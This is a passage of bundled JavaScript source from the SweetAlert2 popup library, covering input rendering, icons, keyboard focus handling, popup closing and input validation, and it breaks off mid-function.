          if (!["id", "type", "value", "style"].includes(attrName)) {
            input.removeAttribute(attrName);
          }
        }
      };
      var setAttributes = function setAttributes2(inputClass, inputAttributes) {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var input = getInput$1(popup, inputClass);
        if (!input) {
          return;
        }
        removeAttributes(input);
        for (var attr in inputAttributes) {
          input.setAttribute(attr, inputAttributes[attr]);
        }
      };
      var setCustomClass = function setCustomClass2(params) {
        if (!params.input) {
          return;
        }
        var inputContainer = getInputContainer(params.input);
        if (inputContainer) {
          applyCustomClass(inputContainer, params, "input");
        }
      };
      var setInputPlaceholder = function setInputPlaceholder2(input, params) {
        if (!input.placeholder && params.inputPlaceholder) {
          input.placeholder = params.inputPlaceholder;
        }
      };
      var setInputLabel = function setInputLabel2(input, prependTo, params) {
        if (params.inputLabel) {
          var label = document.createElement("label");
          var labelClass = swalClasses["input-label"];
          label.setAttribute("for", input.id);
          label.className = labelClass;
          if (_typeof(params.customClass) === "object") {
            addClass(label, params.customClass.inputLabel);
          }
          label.innerText = params.inputLabel;
          prependTo.insertAdjacentElement("beforebegin", label);
        }
      };
      var getInputContainer = function getInputContainer2(inputType) {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        return getDirectChildByClass(popup, swalClasses[
          /** @type {SwalClass} */
          inputType
        ] || swalClasses.input);
      };
      var checkAndSetInputValue = function checkAndSetInputValue2(input, inputValue) {
        if (["string", "number"].includes(_typeof(inputValue))) {
          input.value = "".concat(inputValue);
        } else if (!isPromise(inputValue)) {
          warn('Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(_typeof(inputValue), '"'));
        }
      };
      var renderInputType = {};
      renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = /** @type {(input: Input | HTMLElement, params: SweetAlertOptions) => Input} */
      function(input, params) {
        checkAndSetInputValue(input, params.inputValue);
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        input.type = params.input;
        return input;
      };
      renderInputType.file = function(input, params) {
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        return input;
      };
      renderInputType.range = function(range, params) {
        var rangeInput = range.querySelector("input");
        var rangeOutput = range.querySelector("output");
        checkAndSetInputValue(rangeInput, params.inputValue);
        rangeInput.type = params.input;
        checkAndSetInputValue(rangeOutput, params.inputValue);
        setInputLabel(rangeInput, range, params);
        return range;
      };
      renderInputType.select = function(select, params) {
        select.textContent = "";
        if (params.inputPlaceholder) {
          var placeholder = document.createElement("option");
          setInnerHtml(placeholder, params.inputPlaceholder);
          placeholder.value = "";
          placeholder.disabled = true;
          placeholder.selected = true;
          select.appendChild(placeholder);
        }
        setInputLabel(select, select, params);
        return select;
      };
      renderInputType.radio = function(radio) {
        radio.textContent = "";
        return radio;
      };
      renderInputType.checkbox = function(checkboxContainer, params) {
        var checkbox = getInput$1(getPopup(), "checkbox");
        checkbox.value = "1";
        checkbox.checked = Boolean(params.inputValue);
        var label = checkboxContainer.querySelector("span");
        setInnerHtml(label, params.inputPlaceholder);
        return checkbox;
      };
      renderInputType.textarea = function(textarea, params) {
        checkAndSetInputValue(textarea, params.inputValue);
        setInputPlaceholder(textarea, params);
        setInputLabel(textarea, textarea, params);
        var getMargin = function getMargin2(el) {
          return parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
        };
        setTimeout(function() {
          if ("MutationObserver" in window) {
            var initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
            var textareaResizeHandler = function textareaResizeHandler2() {
              if (!document.body.contains(textarea)) {
                return;
              }
              var textareaWidth = textarea.offsetWidth + getMargin(textarea);
              if (textareaWidth > initialPopupWidth) {
                getPopup().style.width = "".concat(textareaWidth, "px");
              } else {
                applyNumericalStyle(getPopup(), "width", params.width);
              }
            };
            new MutationObserver(textareaResizeHandler).observe(textarea, {
              attributes: true,
              attributeFilter: ["style"]
            });
          }
        });
        return textarea;
      };
      var renderContent = function renderContent2(instance, params) {
        var htmlContainer = getHtmlContainer();
        if (!htmlContainer) {
          return;
        }
        showWhenInnerHtmlPresent(htmlContainer);
        applyCustomClass(htmlContainer, params, "htmlContainer");
        if (params.html) {
          parseHtmlToContainer(params.html, htmlContainer);
          show(htmlContainer, "block");
        } else if (params.text) {
          htmlContainer.textContent = params.text;
          show(htmlContainer, "block");
        } else {
          hide(htmlContainer);
        }
        renderInput(instance, params);
      };
      var renderFooter = function renderFooter2(instance, params) {
        var footer = getFooter();
        if (!footer) {
          return;
        }
        showWhenInnerHtmlPresent(footer);
        toggle(footer, params.footer, "block");
        if (params.footer) {
          parseHtmlToContainer(params.footer, footer);
        }
        applyCustomClass(footer, params, "footer");
      };
      var renderIcon = function renderIcon2(instance, params) {
        var innerParams = privateProps.innerParams.get(instance);
        var icon = getIcon();
        if (!icon) {
          return;
        }
        if (innerParams && params.icon === innerParams.icon) {
          setContent(icon, params);
          applyStyles(icon, params);
          return;
        }
        if (!params.icon && !params.iconHtml) {
          hide(icon);
          return;
        }
        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
          error('Unknown icon! Expected "success", "error", "warning", "info" or "question", got "'.concat(params.icon, '"'));
          hide(icon);
          return;
        }
        show(icon);
        setContent(icon, params);
        applyStyles(icon, params);
        addClass(icon, params.showClass && params.showClass.icon);
      };
      var applyStyles = function applyStyles2(icon, params) {
        for (var _i = 0, _Object$entries = Object.entries(iconTypes); _i < _Object$entries.length; _i++) {
          var _Object$entries$_i = _slicedToArray(_Object$entries[_i], 2), iconType = _Object$entries$_i[0], iconClassName = _Object$entries$_i[1];
          if (params.icon !== iconType) {
            removeClass(icon, iconClassName);
          }
        }
        addClass(icon, params.icon && iconTypes[params.icon]);
        setColor(icon, params);
        adjustSuccessIconBackgroundColor();
        applyCustomClass(icon, params, "icon");
      };
      var adjustSuccessIconBackgroundColor = function adjustSuccessIconBackgroundColor2() {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
        var successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
        for (var i = 0; i < successIconParts.length; i++) {
          successIconParts[i].style.backgroundColor = popupBackgroundColor;
        }
      };
      var successIconHtml = '\n  <div class="swal2-success-circular-line-left"></div>\n  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n  <div class="swal2-success-circular-line-right"></div>\n';
      var errorIconHtml = '\n  <span class="swal2-x-mark">\n    <span class="swal2-x-mark-line-left"></span>\n    <span class="swal2-x-mark-line-right"></span>\n  </span>\n';
      var setContent = function setContent2(icon, params) {
        if (!params.icon && !params.iconHtml) {
          return;
        }
        var oldContent = icon.innerHTML;
        var newContent = "";
        if (params.iconHtml) {
          newContent = iconContent(params.iconHtml);
        } else if (params.icon === "success") {
          newContent = successIconHtml;
          oldContent = oldContent.replace(/ style=".*?"/g, "");
        } else if (params.icon === "error") {
          newContent = errorIconHtml;
        } else if (params.icon) {
          var defaultIconHtml = {
            question: "?",
            warning: "!",
            info: "i"
          };
          newContent = iconContent(defaultIconHtml[params.icon]);
        }
        if (oldContent.trim() !== newContent.trim()) {
          setInnerHtml(icon, newContent);
        }
      };
      var setColor = function setColor2(icon, params) {
        if (!params.iconColor) {
          return;
        }
        icon.style.color = params.iconColor;
        icon.style.borderColor = params.iconColor;
        for (var _i2 = 0, _arr = [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]; _i2 < _arr.length; _i2++) {
          var sel = _arr[_i2];
          setStyle(icon, sel, "background-color", params.iconColor);
        }
        setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
      };
      var iconContent = function iconContent2(content) {
        return '<div class="'.concat(swalClasses["icon-content"], '">').concat(content, "</div>");
      };
      var renderImage = function renderImage2(instance, params) {
        var image = getImage();
        if (!image) {
          return;
        }
        if (!params.imageUrl) {
          hide(image);
          return;
        }
        show(image, "");
        image.setAttribute("src", params.imageUrl);
        image.setAttribute("alt", params.imageAlt || "");
        applyNumericalStyle(image, "width", params.imageWidth);
        applyNumericalStyle(image, "height", params.imageHeight);
        image.className = swalClasses.image;
        applyCustomClass(image, params, "image");
      };
      var renderPopup = function renderPopup2(instance, params) {
        var container = getContainer();
        var popup = getPopup();
        if (!container || !popup) {
          return;
        }
        if (params.toast) {
          applyNumericalStyle(container, "width", params.width);
          popup.style.width = "100%";
          var loader = getLoader();
          if (loader) {
            popup.insertBefore(loader, getIcon());
          }
        } else {
          applyNumericalStyle(popup, "width", params.width);
        }
        applyNumericalStyle(popup, "padding", params.padding);
        if (params.color) {
          popup.style.color = params.color;
        }
        if (params.background) {
          popup.style.background = params.background;
        }
        hide(getValidationMessage());
        addClasses$1(popup, params);
      };
      var addClasses$1 = function addClasses2(popup, params) {
        var showClass = params.showClass || {};
        popup.className = "".concat(swalClasses.popup, " ").concat(isVisible$1(popup) ? showClass.popup : "");
        if (params.toast) {
          addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
          addClass(popup, swalClasses.toast);
        } else {
          addClass(popup, swalClasses.modal);
        }
        applyCustomClass(popup, params, "popup");
        if (typeof params.customClass === "string") {
          addClass(popup, params.customClass);
        }
        if (params.icon) {
          addClass(popup, swalClasses["icon-".concat(params.icon)]);
        }
      };
      var renderProgressSteps = function renderProgressSteps2(instance, params) {
        var progressStepsContainer = getProgressSteps();
        if (!progressStepsContainer) {
          return;
        }
        var progressSteps = params.progressSteps, currentProgressStep = params.currentProgressStep;
        if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
          hide(progressStepsContainer);
          return;
        }
        show(progressStepsContainer);
        progressStepsContainer.textContent = "";
        if (currentProgressStep >= progressSteps.length) {
          warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
        }
        progressSteps.forEach(function(step, index) {
          var stepEl = createStepElement(step);
          progressStepsContainer.appendChild(stepEl);
          if (index === currentProgressStep) {
            addClass(stepEl, swalClasses["active-progress-step"]);
          }
          if (index !== progressSteps.length - 1) {
            var lineEl = createLineElement(params);
            progressStepsContainer.appendChild(lineEl);
          }
        });
      };
      var createStepElement = function createStepElement2(step) {
        var stepEl = document.createElement("li");
        addClass(stepEl, swalClasses["progress-step"]);
        setInnerHtml(stepEl, step);
        return stepEl;
      };
      var createLineElement = function createLineElement2(params) {
        var lineEl = document.createElement("li");
        addClass(lineEl, swalClasses["progress-step-line"]);
        if (params.progressStepsDistance) {
          applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
        }
        return lineEl;
      };
      var renderTitle = function renderTitle2(instance, params) {
        var title = getTitle();
        if (!title) {
          return;
        }
        showWhenInnerHtmlPresent(title);
        toggle(title, params.title || params.titleText, "block");
        if (params.title) {
          parseHtmlToContainer(params.title, title);
        }
        if (params.titleText) {
          title.innerText = params.titleText;
        }
        applyCustomClass(title, params, "title");
      };
      var render = function render2(instance, params) {
        renderPopup(instance, params);
        renderContainer(instance, params);
        renderProgressSteps(instance, params);
        renderIcon(instance, params);
        renderImage(instance, params);
        renderTitle(instance, params);
        renderCloseButton(instance, params);
        renderContent(instance, params);
        renderActions(instance, params);
        renderFooter(instance, params);
        var popup = getPopup();
        if (typeof params.didRender === "function" && popup) {
          params.didRender(popup);
        }
      };
      var isVisible = function isVisible2() {
        return isVisible$1(getPopup());
      };
      var clickConfirm = function clickConfirm2() {
        var _dom$getConfirmButton;
        return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
      };
      var clickDeny = function clickDeny2() {
        var _dom$getDenyButton;
        return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
      };
      var clickCancel = function clickCancel2() {
        var _dom$getCancelButton;
        return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
      };
      var DismissReason = Object.freeze({
        cancel: "cancel",
        backdrop: "backdrop",
        close: "close",
        esc: "esc",
        timer: "timer"
      });
      var removeKeydownHandler = function removeKeydownHandler2(globalState2) {
        if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
          globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = false;
        }
      };
      var addKeydownHandler = function addKeydownHandler2(globalState2, innerParams, dismissWith) {
        removeKeydownHandler(globalState2);
        if (!innerParams.toast) {
          globalState2.keydownHandler = function(e) {
            return keydownHandler(innerParams, e, dismissWith);
          };
          globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
          globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
          globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = true;
        }
      };
      var setFocus = function setFocus2(index, increment) {
        var _dom$getPopup;
        var focusableElements = getFocusableElements();
        if (focusableElements.length) {
          index = index + increment;
          if (index === focusableElements.length) {
            index = 0;
          } else if (index === -1) {
            index = focusableElements.length - 1;
          }
          focusableElements[index].focus();
          return;
        }
        (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
      };
      var arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
      var arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
      var keydownHandler = function keydownHandler2(innerParams, event, dismissWith) {
        if (!innerParams) {
          return;
        }
        if (event.isComposing || event.keyCode === 229) {
          return;
        }
        if (innerParams.stopKeydownPropagation) {
          event.stopPropagation();
        }
        if (event.key === "Enter") {
          handleEnter(event, innerParams);
        } else if (event.key === "Tab") {
          handleTab(event);
        } else if ([].concat(arrowKeysNextButton, arrowKeysPreviousButton).includes(event.key)) {
          handleArrows(event.key);
        } else if (event.key === "Escape") {
          handleEsc(event, innerParams, dismissWith);
        }
      };
      var handleEnter = function handleEnter2(event, innerParams) {
        if (!callIfFunction(innerParams.allowEnterKey)) {
          return;
        }
        var input = getInput$1(getPopup(), innerParams.input);
        if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
          if (["textarea", "file"].includes(innerParams.input)) {
            return;
          }
          clickConfirm();
          event.preventDefault();
        }
      };
      var handleTab = function handleTab2(event) {
        var targetElement = event.target;
        var focusableElements = getFocusableElements();
        var btnIndex = -1;
        for (var i = 0; i < focusableElements.length; i++) {
          if (targetElement === focusableElements[i]) {
            btnIndex = i;
            break;
          }
        }
        if (!event.shiftKey) {
          setFocus(btnIndex, 1);
        } else {
          setFocus(btnIndex, -1);
        }
        event.stopPropagation();
        event.preventDefault();
      };
      var handleArrows = function handleArrows2(key) {
        var actions = getActions();
        var confirmButton = getConfirmButton();
        var denyButton = getDenyButton();
        var cancelButton = getCancelButton();
        if (!actions || !confirmButton || !denyButton || !cancelButton) {
          return;
        }
        var buttons = [confirmButton, denyButton, cancelButton];
        if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
          return;
        }
        var sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
        var buttonToFocus = document.activeElement;
        if (!buttonToFocus) {
          return;
        }
        for (var i = 0; i < actions.children.length; i++) {
          buttonToFocus = buttonToFocus[sibling];
          if (!buttonToFocus) {
            return;
          }
          if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
            break;
          }
        }
        if (buttonToFocus instanceof HTMLButtonElement) {
          buttonToFocus.focus();
        }
      };
      var handleEsc = function handleEsc2(event, innerParams, dismissWith) {
        if (callIfFunction(innerParams.allowEscapeKey)) {
          event.preventDefault();
          dismissWith(DismissReason.esc);
        }
      };
      var privateMethods = {
        swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
        swalPromiseReject: /* @__PURE__ */ new WeakMap()
      };
      var setAriaHidden = function setAriaHidden2() {
        var container = getContainer();
        var bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach(function(el) {
          if (el.contains(container)) {
            return;
          }
          if (el.hasAttribute("aria-hidden")) {
            el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
          }
          el.setAttribute("aria-hidden", "true");
        });
      };
      var unsetAriaHidden = function unsetAriaHidden2() {
        var bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach(function(el) {
          if (el.hasAttribute("data-previous-aria-hidden")) {
            el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
            el.removeAttribute("data-previous-aria-hidden");
          } else {
            el.removeAttribute("aria-hidden");
          }
        });
      };
      var isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
      var iOSfix = function iOSfix2() {
        if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
          var offset = document.body.scrollTop;
          document.body.style.top = "".concat(offset * -1, "px");
          addClass(document.body, swalClasses.iosfix);
          lockBodyScroll();
        }
      };
      var lockBodyScroll = function lockBodyScroll2() {
        var container = getContainer();
        if (!container) {
          return;
        }
        var preventTouchMove;
        container.ontouchstart = function(event) {
          preventTouchMove = shouldPreventTouchMove(event);
        };
        container.ontouchmove = function(event) {
          if (preventTouchMove) {
            event.preventDefault();
            event.stopPropagation();
          }
        };
      };
      var shouldPreventTouchMove = function shouldPreventTouchMove2(event) {
        var target = event.target;
        var container = getContainer();
        var htmlContainer = getHtmlContainer();
        if (!container || !htmlContainer) {
          return false;
        }
        if (isStylus(event) || isZoom(event)) {
          return false;
        }
        if (target === container) {
          return true;
        }
        if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
        target.tagName !== "TEXTAREA" && // #2266
        !(isScrollable(htmlContainer) && // #1944
        htmlContainer.contains(target))) {
          return true;
        }
        return false;
      };
      var isStylus = function isStylus2(event) {
        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
      };
      var isZoom = function isZoom2(event) {
        return event.touches && event.touches.length > 1;
      };
      var undoIOSfix = function undoIOSfix2() {
        if (hasClass(document.body, swalClasses.iosfix)) {
          var offset = parseInt(document.body.style.top, 10);
          removeClass(document.body, swalClasses.iosfix);
          document.body.style.top = "";
          document.body.scrollTop = offset * -1;
        }
      };
      var measureScrollbar = function measureScrollbar2() {
        var scrollDiv = document.createElement("div");
        scrollDiv.className = swalClasses["scrollbar-measure"];
        document.body.appendChild(scrollDiv);
        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      };
      var previousBodyPadding = null;
      var replaceScrollbarWithPadding = function replaceScrollbarWithPadding2(initialBodyOverflow) {
        if (previousBodyPadding !== null) {
          return;
        }
        if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
          previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
          document.body.style.paddingRight = "".concat(previousBodyPadding + measureScrollbar(), "px");
        }
      };
      var undoReplaceScrollbarWithPadding = function undoReplaceScrollbarWithPadding2() {
        if (previousBodyPadding !== null) {
          document.body.style.paddingRight = "".concat(previousBodyPadding, "px");
          previousBodyPadding = null;
        }
      };
      function removePopupAndResetState(instance, container, returnFocus, didClose) {
        if (isToast()) {
          triggerDidCloseAndDispose(instance, didClose);
        } else {
          restoreActiveElement(returnFocus).then(function() {
            return triggerDidCloseAndDispose(instance, didClose);
          });
          removeKeydownHandler(globalState);
        }
        if (isSafariOrIOS) {
          container.setAttribute("style", "display:none !important");
          container.removeAttribute("class");
          container.innerHTML = "";
        } else {
          container.remove();
        }
        if (isModal()) {
          undoReplaceScrollbarWithPadding();
          undoIOSfix();
          unsetAriaHidden();
        }
        removeBodyClasses();
      }
      function removeBodyClasses() {
        removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
      }
      function close(resolveValue) {
        resolveValue = prepareResolveValue(resolveValue);
        var swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
        var didClose = triggerClosePopup(this);
        if (this.isAwaitingPromise) {
          if (!resolveValue.isDismissed) {
            handleAwaitingPromise(this);
            swalPromiseResolve(resolveValue);
          }
        } else if (didClose) {
          swalPromiseResolve(resolveValue);
        }
      }
      var triggerClosePopup = function triggerClosePopup2(instance) {
        var popup = getPopup();
        if (!popup) {
          return false;
        }
        var innerParams = privateProps.innerParams.get(instance);
        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
          return false;
        }
        removeClass(popup, innerParams.showClass.popup);
        addClass(popup, innerParams.hideClass.popup);
        var backdrop = getContainer();
        removeClass(backdrop, innerParams.showClass.backdrop);
        addClass(backdrop, innerParams.hideClass.backdrop);
        handlePopupAnimation(instance, popup, innerParams);
        return true;
      };
      function rejectPromise(error2) {
        var rejectPromise2 = privateMethods.swalPromiseReject.get(this);
        handleAwaitingPromise(this);
        if (rejectPromise2) {
          rejectPromise2(error2);
        }
      }
      var handleAwaitingPromise = function handleAwaitingPromise2(instance) {
        if (instance.isAwaitingPromise) {
          delete instance.isAwaitingPromise;
          if (!privateProps.innerParams.get(instance)) {
            instance._destroy();
          }
        }
      };
      var prepareResolveValue = function prepareResolveValue2(resolveValue) {
        if (typeof resolveValue === "undefined") {
          return {
            isConfirmed: false,
            isDenied: false,
            isDismissed: true
          };
        }
        return Object.assign({
          isConfirmed: false,
          isDenied: false,
          isDismissed: false
        }, resolveValue);
      };
      var handlePopupAnimation = function handlePopupAnimation2(instance, popup, innerParams) {
        var container = getContainer();
        var animationIsSupported = animationEndEvent && hasCssAnimation(popup);
        if (typeof innerParams.willClose === "function") {
          innerParams.willClose(popup);
        }
        if (animationIsSupported) {
          animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
        } else {
          removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
        }
      };
      var animatePopup = function animatePopup2(instance, popup, container, returnFocus, didClose) {
        if (!animationEndEvent) {
          return;
        }
        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
        popup.addEventListener(animationEndEvent, function(e) {
          if (e.target === popup) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
          }
        });
      };
      var triggerDidCloseAndDispose = function triggerDidCloseAndDispose2(instance, didClose) {
        setTimeout(function() {
          if (typeof didClose === "function") {
            didClose.bind(instance.params)();
          }
          if (instance._destroy) {
            instance._destroy();
          }
        });
      };
      var showLoading = function showLoading2(buttonToReplace) {
        var popup = getPopup();
        if (!popup) {
          new Swal();
        }
        popup = getPopup();
        if (!popup) {
          return;
        }
        var loader = getLoader();
        if (isToast()) {
          hide(getIcon());
        } else {
          replaceButton(popup, buttonToReplace);
        }
        show(loader);
        popup.setAttribute("data-loading", "true");
        popup.setAttribute("aria-busy", "true");
        popup.focus();
      };
      var replaceButton = function replaceButton2(popup, buttonToReplace) {
        var actions = getActions();
        var loader = getLoader();
        if (!actions || !loader) {
          return;
        }
        if (!buttonToReplace && isVisible$1(getConfirmButton())) {
          buttonToReplace = getConfirmButton();
        }
        show(actions);
        if (buttonToReplace) {
          hide(buttonToReplace);
          loader.setAttribute("data-button-to-replace", buttonToReplace.className);
          actions.insertBefore(loader, buttonToReplace);
        }
        addClass([popup, actions], swalClasses.loading);
      };
      var handleInputOptionsAndValue = function handleInputOptionsAndValue2(instance, params) {
        if (params.input === "select" || params.input === "radio") {
          handleInputOptions(instance, params);
        } else if (["text", "email", "number", "tel", "textarea"].some(function(i) {
          return i === params.input;
        }) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
          showLoading(getConfirmButton());
          handleInputValue(instance, params);
        }
      };
      var getInputValue = function getInputValue2(instance, innerParams) {
        var input = instance.getInput();
        if (!input) {
          return null;
        }
        switch (innerParams.input) {
          case "checkbox":
            return getCheckboxValue(input);
          case "radio":
            return getRadioValue(input);
          case "file":
            return getFileValue(input);
          default:
            return innerParams.inputAutoTrim ? input.value.trim() : input.value;
        }
      };
      var getCheckboxValue = function getCheckboxValue2(input) {
        return input.checked ? 1 : 0;
      };
      var getRadioValue = function getRadioValue2(input) {
        return input.checked ? input.value : null;
      };
      var getFileValue = function getFileValue2(input) {
        return input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
      };
      var handleInputOptions = function handleInputOptions2(instance, params) {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var processInputOptions = function processInputOptions2(inputOptions) {
          if (params.input === "select") {
            populateSelectOptions(popup, _formatInputOptions(inputOptions), params);
          } else if (params.input === "radio") {
            populateRadioOptions(popup, _formatInputOptions(inputOptions), params);
          }
        };
        if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
          showLoading(getConfirmButton());
          asPromise(params.inputOptions).then(function(inputOptions) {
            instance.hideLoading();
            processInputOptions(inputOptions);
          });
        } else if (_typeof(params.inputOptions) === "object") {
          processInputOptions(params.inputOptions);
        } else {
          error("Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(_typeof(params.inputOptions)));
        }
      };
      var handleInputValue = function handleInputValue2(instance, params) {
        var input = instance.getInput();
        if (!input) {
          return;
        }
        hide(input);
        asPromise(params.inputValue).then(function(inputValue) {
          input.value = params.input === "number" ? "".concat(parseFloat(inputValue) || 0) : "".concat(inputValue);
          show(input);
          input.focus();
          instance.hideLoading();
        })["catch"](function(err) {
          error("Error in inputValue promise: ".concat(err));
          input.value = "";
          show(input);
          input.focus();
          instance.hideLoading();
        });
      };
      function populateSelectOptions(popup, inputOptions, params) {
        var select = getDirectChildByClass(popup, swalClasses.select);
        if (!select) {
          return;
        }
        var renderOption = function renderOption2(parent, optionLabel, optionValue) {
          var option = document.createElement("option");
          option.value = optionValue;
          setInnerHtml(option, optionLabel);
          option.selected = isSelected(optionValue, params.inputValue);
          parent.appendChild(option);
        };
        inputOptions.forEach(function(inputOption) {
          var optionValue = inputOption[0];
          var optionLabel = inputOption[1];
          if (Array.isArray(optionLabel)) {
            var optgroup = document.createElement("optgroup");
            optgroup.label = optionValue;
            optgroup.disabled = false;
            select.appendChild(optgroup);
            optionLabel.forEach(function(o) {
              return renderOption(optgroup, o[1], o[0]);
            });
          } else {
            renderOption(select, optionLabel, optionValue);
          }
        });
        select.focus();
      }
      function populateRadioOptions(popup, inputOptions, params) {
        var radio = getDirectChildByClass(popup, swalClasses.radio);
        if (!radio) {
          return;
        }
        inputOptions.forEach(function(inputOption) {
          var radioValue = inputOption[0];
          var radioLabel = inputOption[1];
          var radioInput = document.createElement("input");
          var radioLabelElement = document.createElement("label");
          radioInput.type = "radio";
          radioInput.name = swalClasses.radio;
          radioInput.value = radioValue;
          if (isSelected(radioValue, params.inputValue)) {
            radioInput.checked = true;
          }
          var label = document.createElement("span");
          setInnerHtml(label, radioLabel);
          label.className = swalClasses.label;
          radioLabelElement.appendChild(radioInput);
          radioLabelElement.appendChild(label);
          radio.appendChild(radioLabelElement);
        });
        var radios = radio.querySelectorAll("input");
        if (radios.length) {
          radios[0].focus();
        }
      }
      var _formatInputOptions = function formatInputOptions(inputOptions) {
        var result = [];
        if (inputOptions instanceof Map) {
          inputOptions.forEach(function(value, key) {
            var valueFormatted = value;
            if (_typeof(valueFormatted) === "object") {
              valueFormatted = _formatInputOptions(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        } else {
          Object.keys(inputOptions).forEach(function(key) {
            var valueFormatted = inputOptions[key];
            if (_typeof(valueFormatted) === "object") {
              valueFormatted = _formatInputOptions(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        }
        return result;
      };
      var isSelected = function isSelected2(optionValue, inputValue) {
        return !!inputValue && inputValue.toString() === optionValue.toString();
      };
      var _this = void 0;
      var handleConfirmButtonClick = function handleConfirmButtonClick2(instance) {
        var innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.input) {
          handleConfirmOrDenyWithInput(instance, "confirm");
        } else {
          confirm(instance, true);
        }
      };
      var handleDenyButtonClick = function handleDenyButtonClick2(instance) {
        var innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.returnInputValueOnDeny) {
          handleConfirmOrDenyWithInput(instance, "deny");
        } else {
          deny(instance, false);
        }
      };
      var handleCancelButtonClick = function handleCancelButtonClick2(instance, dismissWith) {
        instance.disableButtons();
        dismissWith(DismissReason.cancel);
      };
      var handleConfirmOrDenyWithInput = function handleConfirmOrDenyWithInput2(instance, type) {
        var innerParams = privateProps.innerParams.get(instance);
        if (!innerParams.input) {
          error('The "input" parameter is needed to be set when using returnInputValueOn'.concat(capitalizeFirstLetter(type)));
          return;
        }
        var input = instance.getInput();
        var inputValue = getInputValue(instance, innerParams);
        if (innerParams.inputValidator) {
          handleInputValidator(instance, inputValue, type);
        } else if (input && !input.checkValidity()) {
          instance.enableButtons();
          instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
        } else if (type === "deny") {
          deny(instance, inputValue);
        } else {
          confirm(instance, inputValue);
        }
      };
      var handleInputValidator = function handleInputValidator2(instance, inputValue, type) {
        var innerParams = privateProps.innerParams.get(instance);
        instance.disableInput();
        var validationPromise = Promise.resolve().then(function() {
          return asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage));
        });
        validationPromise.then(function(validationMessage) {
          instance.enableButtons();
          instance.enableInput();
          if (validationMessage) {
            instance.showValidationMessage(validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
